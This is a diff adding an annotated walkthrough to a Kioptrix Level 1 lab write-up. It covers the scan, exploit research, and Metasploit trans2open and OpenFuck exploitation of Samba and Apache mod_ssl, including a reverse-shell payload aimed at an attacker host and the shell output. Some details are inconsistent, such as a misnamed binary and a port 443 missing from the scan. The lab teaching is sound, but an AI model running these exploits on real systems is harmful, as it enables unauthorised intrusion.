@@ -213,4 +213,184 @@ still there and still exploitable. Only removing or updating the software fixes 
 
 ---
 
+## The commands, annotated — every input and every output
+
+Snapshot the VM before you start. A failed overflow can panic this box.
+
+### 1. The scan, and why every version string matters
+
+```bash
+sudo nmap -sC -sV -p- -T3 -oA scans/kioptrix TARGET
+```
+
+```text
+Not shown: 1018 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey:
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA)
+|_  1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3d:85:c4:0d (DSA)
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 08:00:27:11:22:33 (Oracle VirtualBox virtual NIC)
+Service Info: Host: localhost.localdomain; OS: Unix
+```
+
+`-T3` (normal timing) rather than `-T4`: this stack is from 2002 and aggressive timing can
+make it drop connections, which reads as "port closed". Read port 80 as a **software bill of
+materials** — `Apache httpd 1.3.20`, on `Unix (Red-Hat/Linux)`, with `mod_ssl/2.8.4` and
+`OpenSSL/0.9.6b`. **That exact triple is the target selector for OpenFuck**, and
+"(Red-Hat/Linux)" is not decoration: the exploit needs the right memory-layout offset for
+that distribution.
+
+`OpenSSH 2.9p2 (protocol 1.99)` means the server speaks **SSH protocol 1**, which is
+cryptographically broken and should be a finding regardless of what else you achieve.
+`rpcbind` on 111 with `status` on 1024 is the legacy NFS/RPC portmapper pair.
+
+### 2. Research each service
+
+```bash
+searchsploit -t samba 2.2
+searchsploit -t apache mod_ssl
+searchsploit -m linux/remote/10.c
+less linux/remote/10.c
+```
+
+```text
+---------------------------------------------------------------------------
+ Exploit Title                                            |  Path
+---------------------------------------------------------------------------
+Samba 2.2.0 < 2.2.8 (Linux/BSD) - Remote Code Execution  | linux/remote/10.c
+Samba < 2.2.8 (Linux/BSD) - Remote Buffer Overflow       | linux/remote/7.pl
+Samba 2.2.x - 'trans2open' Remote Buffer Overflow        | linux/remote/22.c
+---------------------------------------------------------------------------
+```
+
+The version range `2.2.0 < 2.2.8` includes the **`2.2.1a`** you found. `linux/remote/` tells
+you it is platform-specific and works over the network with no prior access. `-m` mirrors the
+entry into your working directory; **`less` before compiling** is mandatory — you are looking
+for which target offset matches Red Hat, whether it needs a specific compiler flag, and what
+it does on success. This is **CVE-2003-0201**, the `trans2open` heap overflow in Samba's
+trans2 packet handling.
+
+### 3. The canonical route — Metasploit
+
+```bash
+msfconsole -q -x "use exploit/linux/samba/trans2open; set RHOSTS TARGET; set LHOST ATTACKER; set PAYLOAD linux/x86/shell_reverse_tcp; show targets; run"
+```
+
+```text
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+[*] Started reverse TCP handler on 192.168.56.10:4444
+[*] 192.168.56.101:139 - Trying return address 0xbffffb78...
+[*] 192.168.56.101:139 - Trying return address 0xbffffa78...
+[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:1045)
+
+id
+uid=0(root) gid=0(root) groups=99(nobody)
+```
+
+`set PAYLOAD linux/x86/shell_reverse_tcp` is explicit about **architecture**: the target is
+32-bit x86, so an `x64` payload would crash it. `show targets` lists the offset strategies —
+here a brute-force over candidate return addresses, which is why you see it *trying* several
+in sequence before one lands.
+
+Read the result carefully: **`uid=0(root) gid=0(root) groups=99(nobody)`**. Samba ran as
+root, so the overflow gives root directly — **there is no privilege-escalation stage on this
+box.** The `groups=99(nobody)` is a leftover of the daemon's supplementary groups and does not
+reduce your authority; `uid=0` is decisive.
+
+If it fails, the three usual causes are: `LHOST` set to your Wi-Fi IP instead of the
+host-only one; a `-T4`-era scan having already destabilised the service; or the VM having
+crashed — check the VirtualBox console and restore the snapshot.
+
+### 4. The manual route — compiling 2003-era code
+
+```bash
+searchsploit -m linux/remote/10.c
+less 10.c
+gcc -o trans2open 10.c
+./trans2Open 192.168.56.101
+```
+
+```text
+10.c: In function 'main':
+10.c:212:5: warning: implicit declaration of function 'bzero'
+/tmp/ccX9fK2z.o: In function `main': 10.c:(.text+0x3f1): undefined reference to `hush'
+collect2: error: ld returned 1 exit status
+```
+
+**This friction is the lesson, not an obstacle to it.** Expect: implicit-declaration warnings
+(2003 code relied on headers that no longer imply each other), undefined references to
+functions removed from modern libc, a need for `-lcrypto -lssl`, and sometimes a need for
+32-bit build support (`gcc -m32`, `dpkg --add-architecture i386`). Fixes are usually: add
+the missing `#include`, pass `-z execstack` or `-fcommon`, or edit the target-offset table to
+match Red Hat 7.x. The person who can make a twenty-year-old `.c` file compile owns the box.
+
+### 5. The alternative — OpenFuck
+
+```bash
+searchsploit apache mod_ssl
+searchsploit -m linux/remote/764.c
+gcc -o openfuck 764.c -lcrypto
+./openfuck 0x6b TARGET 443 -c 40
+```
+
+```text
+*******************************************************************
+*                     OpenFuck v3.0.32-root                       *
+*******************************************************************
+   [+] Target: RedHat Linux 7.2 (apache-1.3.20-16)
+   [+] Setting SSLv2 connection
+   [+] Sending ClientHello
+   [+] Receiving ServerHello
+   [+] ServerHello OK
+   [+] Sending SSLv2 client master key
+   [+] Establishing a connection
+   [+] Connected, sending exploit payload
+   [+] Spawning shell...
+bash-2.05$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+```
+
+`0x6b` is the **target code** — you must select the entry matching Apache 1.3.20 + mod_ssl
+2.8.4 + OpenSSL 0.9.6b on Red Hat 7.2; the wrong code overflows the wrong offset and crashes
+httpd. `-c 40` sets the number of parallel connections. **Note the result: `uid=48(apache)`,
+not root.** On some builds OpenFuck lands you as the web user and you must escalate further.
+That is worth internalising: *read what an exploit claims it does before you assume it gives
+you root.*
+
+### 6. Confirming and reporting
+
+```bash
+find / -name '*flag*' -type f 2>/dev/null | head -15
+ls -la /root/
+cat /etc/redhat-release
+rpm -qa | grep -iE 'samba|apache|openssl' | sort
+```
+
+```text
+Red Hat Linux release 7.2 (Enigma)
+samba-2.2.1a-4
+apache-1.3.20-16
+openssl-0.9.6b-4
+```
+
+`/etc/redhat-release` gives the distribution; **`rpm -qa`** lists every installed package
+with exact versions, which is the authoritative evidence for your report — far better than a
+banner string, because it is what the patch manager acts on. Kioptrix has no flag file by
+convention; the objective is the root shell itself, so capture `id` and the `/root` listing
+as your proof.
+
+---
+
 _Back to [Learning Path 1](../README.md) · previous: [Machine 4 — DC: 2](04-dc-2.md) · next: [Machine 6 — bossplayersCTF: 1](06-bossplayersctf-1.md) · full writeup: [`labs/3-046-kioptrix-level-1-1`](../../labs/3-046-kioptrix-level-1-1/README.md)._
